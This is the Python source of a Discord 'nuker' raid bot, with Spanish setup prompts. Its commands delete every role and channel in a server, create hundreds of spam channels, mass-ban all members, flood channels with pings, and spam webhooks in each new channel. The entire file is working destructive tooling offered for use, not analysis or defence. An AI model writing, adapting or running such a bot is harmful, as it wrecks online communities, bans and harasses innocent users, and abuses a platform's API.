import os, sys, discord, requests, json, threading, random, asyncio, logging
from discord.ext import commands
from os import _exit
from time import sleep
from datetime import datetime

if sys.platform == "win32":
	clear = lambda: os.system("cls")
else:
	clear = lambda: os.system("clear")

with open("token.txt", "r") as file:
    tkn = next(file)

token = (tkn)
prefix = (".")

channelname = input('[OPCIONES] Escribe un nombre para los canales > ')
rolename = input('[OPCIONES] Escribe el nombre de los roles a crear > ')
raidmsg = input('[OPCIONES] Introduce el mensaje a ser spameado > ')

channel_names = (channelname, channelname)
role_names = (rolename, rolename)
webhook_users = ("Raid", "Raid")
webhook_contents = (raidmsg, raidmsg)

bot = commands.Bot(
  command_prefix=("."),
  intents=discord.Intents.all(),
  help_command=None
)

if bot:
	headers = {
	  "Authorization": f"Bot {token}"
	}
else:
	headers = {
	  "Authorization": token
	}

logging.basicConfig(
    level=logging.INFO,
    format= "\033[38;5;89m[\033[38;5;92m%(asctime)s\033[38;5;89m] \033[0m%(message)s",
    datefmt="%H:%M:%S",
)

sessions = requests.Session()

def menu():
	clear()
	logging.info(f"""\033[38;5;91m
	

		 ██████╗███████╗██████╗ ██╗   ██╗███████╗██████╗   ███╗  ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
		██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗  ████╗ ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
		╚█████╗ █████╗  ██████╔╝╚██╗ ██╔╝█████╗  ██████╔╝  ██╔██╗██║██║   ██║█████═╝░█████╗  ██████╔╝
		 ╚═══██╗██╔══╝  ██╔══██╗ ╚████╔╝ ██╔══╝  ██╔══██╗  ██║╚████║██║   ██║██╔═██╗░██╔══╝  ██╔══██╗
		██████╔╝███████╗██║  ██║  ╚██╔╝  ███████╗██║  ██║  ██║ ╚███║╚██████╔╝██║ ╚██╗███████╗██║  ██║
		╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  ╚═╝  ╚══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n\n""")
	logging.info(f"\033[38;5;91mComandos: {prefix}nuke ~ {prefix}massban ~ {prefix}pings ~ {prefix}start")
	logging.info(f"\033[38;5;91mBot: {bot.user}")
	logging.info(f"\033[38;5;91mPrefix: {prefix}")
	logging.info(f"\033[38;5;91mCodigo por discord.gg/antiplague modificado por PanaBruuh#0833")
	

@bot.event
async def on_ready():
	try:
		await bot.change_presence(status=discord.Status.online)
	except Exception:
		pass
	menu()

@bot.event
async def on_message(message):                    
      await bot.process_commands(message)

@bot.command(
  aliases=["kill", "start"]
)
async def on(ctx):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		logging.info(f"Connection Error.")
		sleep(10)
		_exit(0)

	def delete_role(i):
		sessions.delete(
		  f"https://discord.com/api/v9/guilds/{guild}/roles/{i}",
	  	headers=headers
		)

	def delete_channel(i):
		sessions.delete(
		  f"https://discord.com/api/v9/channels/{i}",
		  headers=headers
		)

	def create_channels(i):
		json = {
		  "name": i
		}
		sessions.post(
		  f"https://discord.com/api/v9/guilds/{guild}/channels",
		  headers=headers,
		  json=json
		)

	try:
		for i in range(3):
			for role in list(ctx.guild.roles):
				threading.Thread(
				  target=delete_role, 
				  args=(role.id, )
				  ).start()
				logging.info(f"Role deleted ({role}).")

		for i in range(4):
			for channel in list(ctx.guild.channels):
				threading.Thread(
				  target=delete_channel,
				  args=(channel.id, )
				  ).start()
				logging.info(f"Channel deleted ({channel}).")

		for i in range(500):
			threading.Thread(
			  target=create_channels,
			  args=(random.choice(channel_names), )
			).start()
			logging.info(f"Channel created ({random.choice(channel_names)}).")
	except Exception as error:
		logging.info(f"Connection Error.")
		sleep(10)
		_exit(0)


@bot.command(
  aliases=["ban", "banall"]
)
async def massban(ctx):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		logging.info(f"Connection Error.")
		sleep(10)
		_exit(0)

	def mass_ban(i):
		sessions.put(
		  f"https://discord.com/api/v9/guilds/{guild}/bans/{i}",
		  headers=headers
		)
	try:
		for i in range(3):
			for member in list(ctx.guild.members):
				threading.Thread(
				  target=mass_ban, 
				  args=(member.id, )
				).start()
				logging.info(f"Member Banned ({member}).")
		clear()
		logging.info("Banall completed.")
		menu()
	except Exception as error:
		logging.info("Connection Error.")
		sleep(10)
		_exit(0)

@bot.command(
  aliases=["massping", "mass", "pings"]
)
async def spam(ctx, amount = 30):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		logging.info(f"Connection Error.")
		sleep(10)
		_exit(0)
	
	def mass_ping(i):
	  json = {
	    "content": random.choice("github.com/PanaBruuh"),
	    "tts": False
	  }
	  sessions.post(
	    f"https://discord.com/api/v9/channels/{i}/messages", 
	    headers=headers,
	    json=json
	 )
	try:
		for i in range(amount):
			for channel in list(ctx.guild.channels):
				threading.Thread(
				  target=mass_ping, 
				  args=(channel.id, )
				).start()
				logging.info(f"{random.choice(webhook_contents)} was sent {i} times per channel.")
		clear()
		logging.info("Sent messages.")
		menu()
	except Exception as error:
		logging.info("Connection Error.")
		sleep(10)
		_exit(0)


@bot.command(aliases=["n"])
async def nuke(ctx):
  try:
    await ctx.message.delete()
    guild = ctx.guild.id
  except:
    logging.info(f"Connection Error.")
    sleep(10)
    _exit(0)

  def delete_channel(i):
    sessions.delete(
		  f"https://discord.com/api/v9/channels/{i}",
		  headers=headers
		)

  def create_channels(i):
    json = {
		  "name": i
		}
    sessions.post(
		  f"https://discord.com/api/v9/guilds/{guild}/channels",
		  headers=headers,
		  json=json
		)

  try:
    for i in range(200):
      for channel in list(ctx.guild.channels):
        threading.Thread(
				  target=delete_channel,
				  args=(channel.id, )
				  ).start()
        logging.info(f"Channel deleted ({channel}).")
    for i in range(1):
      threading.Thread(
			  target=create_channels,
			  args=(random.choice(channel_names), )
			).start()
      logging.info(f"Channel created ({random.choice(channel_names)}).")
  except Exception as error:
    logging.info(f"Connection Error. {error}")
    sleep(10)
    _exit(0)

@bot.event
async def on_guild_channel_create(channel):
	try:
		webhook = await channel.create_webhook(name=webhook_users)
		for i in range(130):
			await webhook.send(random.choice(webhook_contents))
			logging.info(f"Webhooks created and spammed {i} times")
		clear()
		menu()
		logging.info("Nuke completed.")
	except Exception:
	  pass


if __name__ == "__main__":
	clear()
	#print("\033[38;5;92m" + license)
	#sleep(3)
	clear()
	logging.info("Loading client.")
	try:
		bot.run(
		  token, 
		  bot=bot
		)
	except Exception:
		logging.error(f"Invalid Token / Intents OFF.")
		sleep(10)
		_exit(0)
